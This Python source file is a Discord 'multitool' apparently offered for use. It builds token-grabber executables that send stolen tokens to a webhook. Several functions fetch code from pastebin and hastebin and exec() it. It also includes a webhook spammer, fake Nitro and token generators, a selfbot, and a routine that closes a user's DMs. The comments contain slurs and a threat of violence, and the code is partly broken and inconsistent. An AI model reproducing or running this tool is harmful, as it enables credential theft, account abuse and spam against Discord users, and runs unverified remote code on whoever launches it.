#--------------------
from asyncio.tasks import wait
import os
from colorama import Fore
import time
import random
import string
import threading
import subprocess
from time import sleep
import sys
import browser_cookie3
import requests
import threading
"""
If you fucking see this kys fatass skid ill harm your family faggot fuck
---------------------------------------------------------------------------------
"""
cuh = [
  Fore.RED,
  Fore.BLUE,
  Fore.LIGHTBLUE_EX,
  Fore.LIGHTYELLOW_EX,
  Fore.CYAN
]



class alreadyPut():
    pass



class gTTS():
    pass



import requests
import json
from datetime import datetime
from discord import Webhook, RequestsWebhookAdapter



def load():
  words = "Link to sb has been copied to clipboard"
  for char in words:
      sleep(0.018)
      sys.stdout.write(char)
      sys.stdout.flush()

def copy2clip(txt):
    cmd='echo '+txt.strip()+'|clip'
    return subprocess.check_call(cmd, shell=True)

def sblink(txt):
    cmd='echo '+txt.strip()+'|clip'
    return subprocess.check_call(cmd, shell=True)


words = "Copying Discord Server to clipboard..."
for char in words:
    sleep(0.018)
    sys.stdout.write(char)
    sys.stdout.flush()

try:
  copy2clip('https://discord.gg/mSsTG4Tqvh')
except:
  print("Could not copy discord for some reason")
  print("https://discord.gg/mSsTG4Tqvh ")


print("")
words = "This was made by stoned.eagle#0005"
for char in words:
    sleep(0.008)
    sys.stdout.write(char)
    sys.stdout.flush()



#_---------------




hwid = str(str(subprocess.check_output('wmic csproduct get uuid')).strip().replace(r"\r", "").split(r"\n")[1].strip())
r = requests.get("https://pastebin.com/raw/paZPCF38")



def printSlow(text):
    for char in text:
        print(char, end="")
        sys.stdout.flush()
        time.sleep(.1)

def Main_Program():
    if hwid in r.text:
        pass
    else:
        print("\nYou are not whitelisted.")
        print("Please contact stoned.eagle#0005 for help.")
        wait(3)
        os.remove('Eagle MultiTool.exe')


if __name__ == "__main__":
    Main_Program()




sleep(2)
def deletion():
   try:
    webhook = input("Webhook: ")
    requests.delete(webhook.rstrip())
    print('\n[SUCCESFUL] - Webhook has been deleted')
   except:
    print("\n[UNSUCCESFUL] - Webhook could not be deleted")

def depressuhn():
  exec(open('accnukez.py').read())

def bru():
    print(f"{random.choice(cuh)}THats not a valid option LMAO RETARD, Restarting because ur fucking stupid")
    time.sleep(2)
    clearConsole()
    designaz()


def mattress():
  random.choice(cuh)

def tokengen():
  os.system('cls; clear')
  designaz()
  try:
    amount = int(input('Amount: '))

    print()
    value = 1
    while value <= amount:
      code = f"{random.choice(cuh)}Nz" + ('').join(random.choices(string.ascii_letters + string.digits, k=59))
      print(f'{code}')
      value += 1
    print('')
    print("90"  + "Invalid. 64 Valid")
  except ValueError:
    print("Not even valid fucking idiot")
    time.sleep(2)
    designaz()



def tokenlogmaker():
    #github.com/NightfallGT
    import tkinter as tk
    from tkinter import filedialog
    from tkinter.messagebox import showerror, showwarning, showinfo
    from PIL import Image, ImageTk
    import threading
    import os

    USE_ICON = False

    def builder(webhook: str) ->bool:
        if '/api/webhooks/' in webhook:
            showinfo('Message',f'Building {webhook}')
            with open('built.py', 'w', encoding='UTF-8') as f:
                f.write('from src import TokenGrab\n')
                f.write(f'TokenGrab("{webhook}").start()\n')
                return True
        else:
            showerror('Error', 'That is not a webhook link!')

        return False

    def pack(path: str):
        if USE_ICON:
            print('Adding icon to exe file')
            os.system(f'pyinstaller --noconfirm --onefile --console --icon "{USE_ICON}"  "{path}"')

        else:
            print('Exe file (no icon)')
            os.system(f'pyinstaller --noconfirm --onefile --console "{path}"')

    def main():
        global USE_ICON

        anim = None
        count = 0

        def t_webhook() -> None:
            t1 = threading.Thread(target=get_webhook, daemon= True)
            t1.start()

        def get_webhook() -> None:
            gif_label.grid(column= 1, row= 3)
            webhook = webhook_input.get()
            text1 = tk.Label(root, text= 'Building .py file. Please wait.', font=('Raleway',7))
            text1.grid(column= 1, row= 3)

            check =builder(webhook)

            if check:
                text1.config(text="Finished building .py file. Packing to exe..")
                button['state'] = tk.DISABLED
                webhook_input.grid_forget()
                file_path = (os.path.abspath(os.getcwd()) + '\\built.py')

                thread1 = threading.Thread(target= pack, args= (file_path,), daemon=True)
                thread1.start()
                thread1.join()

                text1.grid_forget()

                print('Completed packing to .exe')
                tk.Label(root, text= 'Finished', font=('Raleway',7)).grid(column= 1, row= 3)

                gif_label.grid_forget()

            else:
                text1.config(text="Unable to build .py file.")
                gif_label.grid_forget()

        def add_icon() -> None:
            global USE_ICON
            icon_path = filedialog.askopenfilename()
            USE_ICON = icon_path

        def animation(count: int) -> None:
            global anim
            im2 = im[count]

            gif_label.configure(image=im2)
            count += 1
            if count == frames:
                count = 0

            anim = root.after(50,lambda :animation(count))

        root = tk.Tk()
        root.iconbitmap('assets/icon.ico')
        root.title('Simple Token Grabber Builder')

        # GIF 
        file="assets/load.gif"
        info = Image.open(file)
        frames = info.n_frames  

        im = [tk.PhotoImage(file=file,format=f"gif -index {i}") for i in range(frames)]

        gif_label = tk.Label(root,image="")

        #gif_label.grid(column= 1, row= 3)
        #gif_label.grid_forget()
        # GIF END
        
        animation(count)

        canvas = tk.Canvas(root, width= 600, height=150) 
        canvas.grid(columnspan = 3)

        logo = Image.open('assets/logo.png')
        logo = ImageTk.PhotoImage(logo)
        logo_label = tk.Label(image=logo)
        logo_label.image = logo
        logo_label.grid(column=1,row=0)

        menubar = tk.Menu(root)
        options = tk.Menu(menubar, tearoff=False)
        options.add_command(label="Add Icon", command=add_icon)

        menubar.add_cascade(label="File", menu=options)
        root.config(menu=menubar)

        webhook_input = tk.Entry(root, width=35)
        webhook_input.grid(column=1, row=1)

        img = Image.open('assets/build.png')
        img_btn = ImageTk.PhotoImage(img)


        button = tk.Button(root, command=t_webhook,image= img_btn, borderwidth=0)
    

        button.grid(column=1, row=2, pady=30)

        root.mainloop()

    if __name__ == '__main__':
        main()





def accnuke():
  os.system('accnuke.cpp')

def cookiez():
  bru = "https://pastebin.com/raw/KepauvG7"
  cuh = requests.get(bru)
  exec(cuh.text)


def clearConsole():
    command = 'clear'
    if os.name in ('nt', 'dos'):  # If Machine is running on Windows, use cls
        command = 'cls'
    os.system(command)
clearConsole()

def cloze(Token):
    headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
    close_dm_request = requests.get(
        "https://canary.discord.com/api/v8/users/@me/channels", headers=headers
    ).json()
    for channel in close_dm_request:
        requests.delete(
            f"https://canary.discord.com/api/v8/channels/{channel['id']}",
            headers=headers,
        )



def reasons(self):
        print('\n{0} [>] {1}[1] > [ILLEGAL CONTENT]'.format(Fore.BLUE, Fore.WHITE))
        print('{0} [>] {1}[2] > [HARASSMENT]'.format(Fore.BLUE, Fore.WHITE))
        print('{0} [>] {1}[3] > [SPAM/PHISHING]'.format(Fore.BLUE, Fore.WHITE))
        print('{0} [>] {1}[4] > [SELF-HARM]'.format(Fore.BLUE, Fore.WHITE))
        print('{0} [>] {1}[5] > [NSFW]'.format(Fore.BLUE, Fore.WHITE))
        option = str(input('\n{0} > {1}'.format(Fore.BLUE, Fore.WHITE)))
        if option == '1' or option == 'Illegal Content':
            self.reason = 0
        elif option == '2' or option == 'Harassment':
            self.reason = 1
        elif option == '3' or option == 'Spam or Phishing Links':
            self.reason = 2
        elif option == '4' or option == 'Self Harm':
            self.reason = 3
        elif option == '5' or option == 'NSFW Content':
            self.reason = 4
        else:
            self.reasons()



def nitrogen():
    os.system('cls; clear')
    designaz()
    try:
      amount = int(input('Amount: '))
      print()
      value = 1
      while value <= amount:
        code = "https://discord.gift/" + ('').join(random.choices(string.ascii_letters + string.digits, k=16))
        print(f'{code}')
        value += 1
      print('')
      print(F'0 Valid. {amount} Invalid')
    except ValueError:
      print('Invalid choice')
    os.system('python main.py')

def eagleznuke():
  os.system('python sadness.py')


def designaz():
  clearConsole()
  print(f"""   
  
{random.choice(cuh)}  

███████╗████████╗ ██████╗ ███╗   ██╗███████╗██████╗{random.choice(cuh)}
██╔════╝╚══██╔══╝██╔═══██╗████╗  ██║██╔════╝██╔══██╗{random.choice(cuh)}
███████╗   ██║   ██║   ██║██╔██╗ ██║█████╗  ██║  ██{random.choice(cuh)}
╚════██║   ██║   ██║   ██║██║╚██╗██║██╔══╝  ██║  ██║{random.choice(cuh)}
███████║   ██║   ╚██████╔╝██║ ╚████║███████╗██████╔╝{random.choice(cuh)}
╚══════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═════╝ {random.choice(cuh)} 
                                                    

_                       _           """)

print(f"""   {random.choice(cuh)}
_.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._
 ,'_.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._`.

 1. All Stuff {random.choice(cuh)}
 2. Token Manager {random.choice(cuh)}
 3. Eagle Logger Builder 
 4. Exit{random.choice(cuh)}
 
 (_.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._) )
 `._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._,'
  
""")



def tokenzuwu():
  print(f"""
  _.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._
 ,'_.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._`.

 
 1. Token Checker{Fore.LIGHTBLUE}
 

  
  
  """)


def start(self):
  self.reasons()
  def my_function():
      self.crucifix_report()
  while True:
      if threading.active_count() <= self.threads:
          threading.Thread(target = my_function).start()


#-----------




import base64
def tokenfromuserid():
    os.system('cls; clear')
    designaz()
    userid = input(f'{random.choice(cuh)}UserID: ')
    string_b = f"{userid}".encode('utf')
    bas64_bytes = base64.b64encode(string_b)
    print()
    print(f'{random.choice(cuh)}Half Token: --\/')
    print(bas64_bytes.decode('utf-8'))
    os.system('pause > NUL')
    designaz()


def arsky():
  os.system('python arsky.cpp1')

def webhookspam():
  bru = "https://hastebin.com/raw/eqokaxuzul"
  cuh = requests.get(bru)
  exec(cuh.text)

def tokenkill():
  os.system('python accnuke.cpp')

def spamz():
    import requests, os, platform, time
    from colorama import Fore

    cuh = [
    Fore.RED,
    Fore.BLUE,
    Fore.LIGHTBLUE_EX,
    Fore.LIGHTYELLOW_EX,
    Fore.CYAN
    ]


    print(Fore.CYAN + """

    ███████╗████████╗ ██████╗ ███╗   ██╗███████╗██████╗{random.choice(cuh)}
    ██╔════╝╚══██╔══╝██╔═══██╗████╗  ██║██╔════╝██╔══██╗{random.choice(cuh)}
    ███████╗   ██║   ██║   ██║██╔██╗ ██║█████╗  ██║  ██{random.choice(cuh)}
    ╚════██║   ██║   ██║   ██║██║╚██╗██║██╔══╝  ██║  ██║{random.choice(cuh)}
    ███████║   ██║   ╚██████╔╝██║ ╚████║███████╗██████╔╝{random.choice(cuh)}
    ╚══════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═════╝ {random.choice(cuh)} 
        
                        ░                                                                                                                                                                          
    """
    + Fore.YELLOW + "https://github.com/GiulCodez/DiscordWebhookSpammer")
    print("")

    webhook = input(Fore.RED +">>Please enter the Webhook: ") # input for webhook url
    text = input(">>Please enter the Message that should be spammed: ") # asks for message

    if platform.system() == "Windows": # checking the OS of the device running the tool
        clearcmd = "cls"
    else:
        clearcmd = "clear"

    os.system(clearcmd)

    data = {
        "content": text # data for webhook as json
    }
    def send(i):
        res = requests.post(webhook, data=data) # sends data to webhook
        try:
            print(Fore.RED + 'getting ratelimited, waiting ' + str(res.json()["retry_after"]) + 'ms.')
            # response: {'global': False, 'message': 'You are being rate limited.', 'retry_after': 12345)}
            time.sleep(res.json()["retry_after"]/1000)
            res = 'waited ' + Fore.RED + str(res.json()["retry_after"]) + 'ms.'
        except:
            i += 1
            res = "Sent message " + text + " successful."
        print(Fore.MAGENTA + res + Fore.MAGENTA + ' Amount of messages already sent: ' + Fore.CYAN + str(i)) # message for feedback lol
        return i
    i = 0
    while True: #loop
        try:
         i = send(i)
        except Exception as e: print(e)
        print("An Error Occured. Is the webhook Valid bro?")
        break

def moretools():
  designaz()
  print(f"""
  {random.choice(cuh)}
   _.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._
 ,'_.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._`.

{random.choice(cuh)}
 1. Half Token From id{random.choice(cuh)}
 2. Mass Report Bot{random.choice(cuh)}
  
  
  """)

  bruh = input("option:")
  if bruh == "1":
    tokenfromuserid()
  if bruh == "2":
    reasons()





def selfbot():
  copy2clip('This is on my clipboard!')


class Exeter:
    pass

class config:
    pass
class gTTs:
    pass

class nitro_sniper:
    pass


def arskyz():
  import asyncio
  import datetime
  import functools
  import io
  import json
  import os
  import random
  import re
  import string
  import urllib.parse
  import urllib.request
  import time
  from urllib import parse, request
  from itertools import cycle
  from bs4 import BeautifulSoup as bs4

  import aiohttp
  import colorama
  import discord
  import numpy
  import requests
  from PIL import Image
  from colorama import Fore
  from discord.ext import commands
  from discord.utils import get


  class SELFBOT():
      __version__ = 1



  prefix = input("Prefix Here >")

  stream_url = "https://www.twitch.tv/odawg62"
  tts_language = "en"

  start_time = datetime.datetime.utcnow()
  loop = asyncio.get_event_loop()

  languages = {
      'hu': 'Hungarian, Hungary',
      'nl': 'Dutch, Netherlands',
      'no': 'Norwegian, Norway',
      'pl': 'Polish, Poland',
      'pt-BR': 'Portuguese, Brazilian, Brazil',
      'ro': 'Romanian, Romania',
      'fi': 'Finnish, Finland',
      'sv-SE': 'Swedish, Sweden',
      'vi': 'Vietnamese, Vietnam',
      'tr': 'Turkish, Turkey',
      'cs': 'Czech, Czechia, Czech Republic',
      'el': 'Greek, Greece',
      'bg': 'Bulgarian, Bulgaria',
      'ru': 'Russian, Russia',
      'uk': 'Ukranian, Ukraine',
      'th': 'Thai, Thailand',
      'zh-CN': 'Chinese, China',
      'ja': 'Japanese',
      'zh-TW': 'Chinese, Taiwan',
      'ko': 'Korean, Korea'
  }

  locales = [
      "da", "de",
      "en-GB", "en-US",
      "es-ES", "fr",
      "hr", "it",
      "lt", "hu",
      "nl", "no",
      "pl", "pt-BR",
      "ro", "fi",
      "sv-SE", "vi",
      "tr", "cs",
      "el", "bg",
      "ru", "uk",
      "th", "zh-CN",
      "ja", "zh-TW",
      "ko"
  ]

  m_numbers = [
      ":one:",
      ":two:",
      ":three:",
      ":four:",
      ":five:",
      ":six:"
  ]

  m_offets = [
      (-1, -1),
      (0, -1),
      (1, -1),
      (-1, 0),
      (1, 0),
      (-1, 1),
      (0, 1),
      (1, 1)
  ]


  6
  def startprint():
      if nitro_sniper:
          nitro = "Active"
      else:
          nitro = "Disabled"

      print(f'''{Fore.CYAN}
  Eagle is daddy
                                                  
                        {Fore.CYAN}Arsky v{SELFBOT.__version__} | {Fore.CYAN}Logged in as: {Arsky.user.name}#{Arsky.user.discriminator} {Fore.CYAN}| ID: {Fore.CYAN}{Arsky.user.id}   
                        {Fore.CYAN}Nitro Sniper | {Fore.CYAN}{nitro}
                        {Fore.CYAN}Cached Users: {Fore.CYAN}{len(Arsky.users)}
                        {Fore.CYAN}Guilds: {Fore.CYAN}{len(Arsky.guilds)}
                        {Fore.CYAN}Prefix: {Fore.CYAN}{Arsky.command_prefix}
      ''' + Fore.RESET)


  def Clear():
      os.system('cls')


  Clear()


  def Init():
      token = input("Token Here >")
      try:
          Arsky.run(token, bot=False, reconnect=True)
          os.system(f'title (Arsky Selfbot) - Version {SELFBOT.__version__}')
      except discord.errors.LoginFailure:
          print(f"{Fore.RED}[ERROR] {Fore.YELLOW}Improper token has been passed" + Fore.RESET)
          os.system('pause >NUL')


  class Login(discord.Client):
      async def on_connect(self):
          guilds = len(self.guilds)
          users = len(self.users)
          print("")
          print(f"Connected to: [{self.user.name}]")
          print(f"Token: {self.http.token}")
          print(f"Guilds: {guilds}")
          print(f"Users: {users}")
          print("-------------------------------")
          await self.logout()


  def async_executor():
      def outer(func):
          @functools.wraps(func)
          def inner(*args, **kwargs):
              thing = functools.partial(func, *args, **kwargs)
              return loop.run_in_executor(None, thing)

          return inner

      return outer

  @async_executor()
  def do_tts(message):
      f = io.BytesIO()
      tts = gTTS(text=message.lower(), lang=tts_language)
      tts.write_to_fp(f)
      f.seek(0)
      return f


  def Dump(ctx):
      for member in ctx.guild.members:
          f = open(f'Images/{ctx.guild.id}-Dump.txt', 'a+')
          f.write(str(member.avatar_url) + '\n')


  def Nitro():
      code = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
      return f'https://discord.gift/{code}'


  def RandomColor():
      randcolor = discord.Color(random.randint(0x000000, 0xFFFFFF))
      return randcolor


  def RandString():
      return "".join(random.choice(string.ascii_letters + string.digits) for i in range(random.randint(14, 32)))


  colorama.init()
  Arsky = discord.Client()
  Arsky = commands.Bot(description='Arsky Selfbot', command_prefix=prefix, self_bot=True)

  Arsky.antiraid = False
  Arsky.msgsniper = True
  Arsky.slotbot_sniper = True
  Arsky.giveaway_sniper = True
  Arsky.mee6 = False
  Arsky.mee6_channel = None
  Arsky.yui_kiss_user = None
  Arsky.yui_kiss_channel = None
  Arsky.yui_hug_user = None
  Arsky.yui_hug_channel = None
  Arsky.sniped_message_dict = {}
  Arsky.sniped_edited_message_dict = {}
  Arsky.whitelisted_users = {}
  Arsky.copycat = None
  Arsky.remove_command('help')


  @Arsky.event
  async def on_command_error(ctx, error):
      error_str = str(error)
      error = getattr(error, 'original', error)
      if isinstance(error, commands.CommandNotFound):
          return
      elif isinstance(error, commands.CheckFailure):
          await ctx.send('[ERROR]: You\'re missing permission to execute this command', delete_after=3)
      elif isinstance(error, commands.MissingRequiredArgument):
          await ctx.send(f"[ERROR]: Missing arguments: {error}", delete_after=3)
      elif isinstance(error, numpy.AxisError):
          await ctx.send('Invalid Image', delete_after=3)
      elif isinstance(error, discord.errors.Forbidden):
          await ctx.send(f"[ERROR]: 404 Forbidden Access: {error}", delete_after=3)
      elif "Cannot send an empty message" in error_str:
          await ctx.send('[ERROR]: Message contents cannot be null', delete_after=3)
      else:
          ctx.send(f'[ERROR]: {error_str}', delete_after=3)


  @Arsky.event
  async def on_message_edit(before, after):
      await Arsky.process_commands(after)


  @Arsky.event
  async def on_message(message):
      if Arsky.copycat is not None and Arsky.copycat.id == message.author.id:
          await message.channel.send(chr(173) + message.content)

      def GiveawayData():
          print(
              f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
              f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
              + Fore.RESET)

      def SlotBotData():
          print(
              f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
              f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
              + Fore.RESET)

      def NitroData(elapsed, code):
          print(
              f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
              f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
              f"\n{Fore.WHITE} - AUTHOR: {Fore.YELLOW}[{message.author}]"
              f"\n{Fore.WHITE} - ELAPSED: {Fore.YELLOW}[{elapsed}]"
              f"\n{Fore.WHITE} - CODE: {Fore.YELLOW}{code}"
              + Fore.RESET)

      time = datetime.datetime.now().strftime("%H:%M %p")
      if 'discord.gift/' in message.content:
          if nitro_sniper:
              start = datetime.datetime.now()
              code = re.search("discord.gift/(.*)", message.content).group(1)
              token = ""

              headers = {'Authorization': token}

              r = requests.post(
                  f'https://discordapp.com/api/v6/entitlements/gift-codes/{code}/redeem',
                  headers=headers,
              ).text

              elapsed = datetime.datetime.now() - start
              elapsed = f'{elapsed.seconds}.{elapsed.microseconds}'

              if 'This gift has been redeemed already.' in r:
                  print(""
                        f"\n{Fore.CYAN}[{time} - Nitro Already Redeemed]" + Fore.RESET)
                  NitroData(elapsed, code)

              elif 'subscription_plan' in r:
                  print(""
                        f"\n{Fore.CYAN}[{time} - Nitro Success]" + Fore.RESET)
                  NitroData(elapsed, code)

              elif 'Unknown Gift Code' in r:
                  print(""
                        f"\n{Fore.CYAN}[{time} - Nitro Unknown Gift Code]" + Fore.RESET)
                  NitroData(elapsed, code)
          else:
              return

      if 'Someone just dropped' in message.content:
          if Exeter.slotbot_sniper:
              if message.author.id == 346353957029019648:
                  try:
                      await message.channel.send('~grab')
                  except discord.errors.Forbidden:
                      print(""
                            f"\n{Fore.CYAN}[{time} - SlotBot Couldnt Grab]" + Fore.RESET)
                      SlotBotData()
                  print(""
                        f"\n{Fore.CYAN}[{time} - Slotbot Grabbed]" + Fore.RESET)
                  SlotBotData()
          else:
              return

      if 'GIVEAWAY' in message.content:
          if Exeter.giveaway_sniper:
              if message.author.id == 294882584201003009:
                  try:
                      await message.add_reaction("🎉")
                  except discord.errors.Forbidden:
                      print(""
                            f"\n{Fore.CYAN}[{time} - Giveaway Couldnt React]" + Fore.RESET)
                      GiveawayData()
                  print(""
                        f"\n{Fore.CYAN}[{time} - Giveaway Sniped]" + Fore.RESET)
                  GiveawayData()
          else:
              return

      if f'Congratulations <@{Arsky.user.id}>' in message.content:
          if Arsky.giveaway_sniper:
              if message.author.id == 294882584201003009:
                  print(""
                        f"\n{Fore.CYAN}[{time} - Giveaway Won]" + Fore.RESET)
                  GiveawayData()
          else:
              return

      await Arsky.process_commands(message)





  @Arsky.event
  async def on_member_ban(guild: discord.Guild, user: discord.user):
      if Arsky.antiraid is True:
          try:
              async for i in guild.audit_logs(limit=1, action=discord.AuditLogAction.ban):
                  if guild.id in Arsky.whitelisted_users.keys() and i.user.id in Arsky.whitelisted_users[
                      guild.id].keys() and i.user.id is not Arsky.user.id:
                      print("not banned - " + i.user.name)
                  else:
                      print("banned - " + i.user.name)
                      await guild.ban(i.user, reason="Exeter Anti-Nuke")
          except Exception as e:
              print(e)


  @Arsky.event
  async def on_member_join(member):
      if Exeter.antiraid is True and member.bot:
          try:
              guild = member.guild
              async for i in guild.audit_logs(limit=1, action=discord.AuditLogAction.bot_add):
                  if member.guild.id in Exeter.whitelisted_users.keys() and i.user.id in Exeter.whitelisted_users[
                      member.guild.id].keys():
                      return
                  else:
                      await guild.ban(member, reason="Exeter Anti-Nuke")
                      await guild.ban(i.user, reason="Exeter Anti-Nuke")
          except Exception as e:
              print(e)


  @Arsky.event
  async def on_member_remove(member):
      if Arsky.antiraid is True:
          try:
              guild = member.guild
              async for i in guild.audit_logs(limit=1, action=discord.AuditLogAction.kick):
                  if guild.id in Arsky.whitelisted_users.keys() and i.user.id in Arsky.whitelisted_users[
                      guild.id].keys() and i.user.id is not Exeter.user.id:
                      print('not banned')
                  else:
                      print('banned')
                      await guild.ban(i.user, reason="Arsky Anti-Nuke")
          except Exception as e:
              print(e)


  @Arsky.command(aliases=["queue"])
  async def play(ctx, *, query):
      await ctx.message.delete()
      voice = get(Arsky.voice_clients, guild=ctx.guild)
      if voice and voice.is_connected():
          voice.play('song.mp3')
      else:
          await ctx.send('You need to be a in VC to play music')


  @Arsky.command()
  async def stop(ctx):
      await ctx.message.delete()
      await ctx.send("Stopped the music player!")





  @Arsky.command()
  async def mreport(ctx, *, user: discord.Member = None):
    await ctx.message.delete()
    if user:
        await ctx.send(f"hello, {user.mention}")
    else:
          await ctx.send('Who tf u reporting?')

  @Arsky.command()
  async def skip(ctx):
      await ctx.message.delete()
      await ctx.send("Skipped song!")


  @Arsky.command(aliases=["lyric"])
  async def lyrics(ctx, *, args):
      await ctx.message.delete()
      await ctx.send("Showing lyrics for " + args)


  @Arsky.command(aliases=[])
  async def msgsniper(ctx, msgsniperlol=None):
      await ctx.message.delete()
      if str(msgsniperlol).lower() == 'true' or str(msgsniperlol).lower() == 'on':
          Arsky.msgsniper = True
          await ctx.send('Arsky Message-Sniper is now **enabled**')
      elif str(msgsniperlol).lower() == 'false' or str(msgsniperlol).lower() == 'off':
          Exeter.msgsniper = False
          await ctx.send('Arsky Message-Sniper is now **disabled**')


  @Arsky.command(aliases=['ar', 'antiraid'])
  async def antinuke(ctx, antiraidparameter=None):
      await ctx.message.delete()
      Exeter.antiraid = False
      if str(antiraidparameter).lower() == 'true' or str(antiraidparameter).lower() == 'on':
          Arsky.antiraid = True
          await ctx.send('Anti-Nuke is now **enabled**')
      elif str(antiraidparameter).lower() == 'false' or str(antiraidparameter).lower() == 'off':
          Arsky.antiraid = False
          await ctx.send('Anti-Nuke is now **disabled**')


  @Arsky.command(aliases=['wl'])
  async def whitelist(ctx, user: discord.Member = None):
      await ctx.message.delete()
      if user is None:
          await ctx.send("Please specify a user to whitelist")
      else:
          if ctx.guild.id not in Arsky.whitelisted_users.keys():
              Arsky.whitelisted_users[ctx.guild.id] = {}
          if user.id in Arsky.whitelisted_users[ctx.guild.id]:
              await ctx.send('That user is already whitelisted')
          else:
              Exeter.whitelisted_users[ctx.guild.id][user.id] = 0
              await ctx.send("Whitelisted **" + user.name.replace("*", "\*").replace("`", "\`").replace("_",
                                                                                                        "\_") + "#" + user.discriminator + "**")
      # else:
      #     user = Arsky.get_user(id)
      #     if user is None:
      #         await ctx.send("Couldn't find that user")
      #         return
      #     if ctx.guild.id not in Arsky.whitelisted_users.keys():
      #         Arsky.whitelisted_users[ctx.guild.id] = {}
      #     if user.id in Arsky.whitelisted_users[ctx.guild.id]:
      #         await ctx.send('That user is already whitelisted')
      #     else:
      #         Arsky.whitelisted_users[ctx.guild.id][user.id] = 0
      #         await ctx.send("Whitelisted **" + user.name.replace("*", "\*").replace("`", "\`").replace("_","\_") + "#" + user.discriminator + "**")


  @Arsky.command(aliases=['wld'])
  async def whitelisted(ctx, g=None):
      await ctx.message.delete()
      if g == '-g' or g == '-global':
          whitelist = '`All Whitelisted Users:`\n'
          for key in Arsky.whitelisted_users:
              for key2 in Arsky.whitelisted_users[key]:
                  user = Arsky.get_user(key2)
                  whitelist += '**+ ' + user.name.replace('*', "\*").replace('`', "\`").replace('_',
                                                                                                "\_") + "#" + user.discriminator + "** - " + Exeter.get_guild(
                      key).name.replace('*', "\*").replace('`', "\`").replace('_', "\_") + "" + "\n"
          await ctx.send(whitelist)
      else:
          whitelist = "`" + ctx.guild.name.replace('*', "\*").replace('`', "\`").replace('_',
                                                                                        "\_") + '\'s Whitelisted Users:`\n'
          for key in Arsky.whitelisted_users:
              if key == ctx.guild.id:
                  for key2 in Arsky.whitelisted_users[ctx.guild.id]:
                      user = Arsky.get_user(key2)
                      whitelist += '**+ ' + user.name.replace('*', "\*").replace('`', "\`").replace('_',
                                                                                                    "\_") + "#" + user.discriminator + " (" + str(
                          user.id) + ")" + "**\n"
          await ctx.send(whitelist)


  @Arsky.command(aliases=['uwl'])
  async def unwhitelist(ctx, user: discord.Member = None):
      if user is None:
          await ctx.send("Please specify the user you would like to unwhitelist")
      else:
          if ctx.guild.id not in Exeter.whitelisted_users.keys():
              await ctx.send("That user is not whitelisted")
              return
          if user.id in Exeter.whitelisted_users[ctx.guild.id]:
              Exeter.whitelisted_users[ctx.guild.id].pop(user.id, 0)
              user2 = Exeter.get_user(user.id)
              await ctx.send(
                  'Successfully unwhitelisted **' + user2.name.replace('*', "\*").replace('`', "\`").replace('_',
                                                                                                            "\_") + '#' + user2.discriminator + '**')


  @Arsky.command(aliases=['clearwl', 'clearwld'])
  async def clearwhitelist(ctx):
      await ctx.message.delete()
      Arsky.whitelisted_users.clear()
      await ctx.send('Successfully cleared the whitelist hash')


  @Arsky.command()
  async def yuikiss(ctx, user: discord.User = None):
      await ctx.message.delete()
      if isinstance(ctx.message.channel, discord.DMChannel) or isinstance(ctx.message.channel, discord.GroupChannel):
          await ctx.send("You can't use Yui Kiss in DMs or GCs", delete_after=3)
      else:
          if user is None:
              await ctx.send("Please specify a user to Yui Kiss", delete_after=3)
              return
          Arsky.yui_kiss_user = user.id
          Arsky.yui_kiss_channel = ctx.channel.id
          if Arsky.yui_kiss_user is None or Arsky.yui_kiss_channel is None:
              await ctx.send('An impossible error occured, try again later or contact swag')
              return
          while Arsky.yui_kiss_user is not None and Arsky.yui_kiss_channel is not None:
              await Arsky.get_channel(Arsky.yui_kiss_channel).send('yui kiss ' + str(Arsky.yui_kiss_user), delete_after=0.1)
              await asyncio.sleep(60)


  @Arsky.command()
  async def yuihug(ctx, user: discord.User = None):
      await ctx.message.delete()
      if isinstance(ctx.message.channel, discord.DMChannel) or isinstance(ctx.message.channel, discord.GroupChannel):
          await ctx.send("You can't use Yui Hug in DMs or GCs", delete_after=3)
      else:
          if user is None:
              await ctx.send("Please specify a user to Yui Hug", delete_after=3)
              return
          Arsky.yui_hug_user = user.id
          Arsky.yui_hug_channel = ctx.channel.id
          if Arsky.yui_hug_user is None or Arsky.yui_hug_channel is None:
              await ctx.send('An impossible error occured, try again later or contact swag')
              return
          while Exeter.yui_hug_user is not None and Exeter.yui_hug_channel is not None:
              await Exeter.get_channel(Exeter.yui_hug_channel).send('yui hug ' + str(Exeter.yui_hug_user), delete_after=0.1)
              await asyncio.sleep(60)

  @Arsky.command()
  async def yuistop(ctx):
      await ctx.message.delete()
      Arsky.yui_kiss_user = None
      Arsky.yui_kiss_channel = None
      Arsky.yui_hug_user = None
      Arsky.yui_hug_channel = None
      await ctx.send('Successfully **disabled** Yui Loops', delete_after=3)

  @Arsky.command(aliases=["automee6"])
  async def mee6(ctx, param=None):
      await ctx.message.delete()
      if param is None:
          await ctx.send("Please specify yes or no", delete_after=3)
          return
      if str(param).lower() == 'true' or str(param).lower() == 'on':
          if isinstance(ctx.message.channel, discord.DMChannel) or isinstance(ctx.message.channel, discord.GroupChannel):
              await ctx.send("You can't bind Auto-MEE6 to a DM or GC", delete_after=3)
              return
          else:
              Arsky.mee6 = True
              await ctx.send("Auto-MEE6 Successfully bound to `" + ctx.channel.name + "`", delete_after=3)
              Exeter.mee6_channel = ctx.channel.id
      elif str(param).lower() == 'false' or str(param).lower() == 'off':
          Exeter.mee6 = False
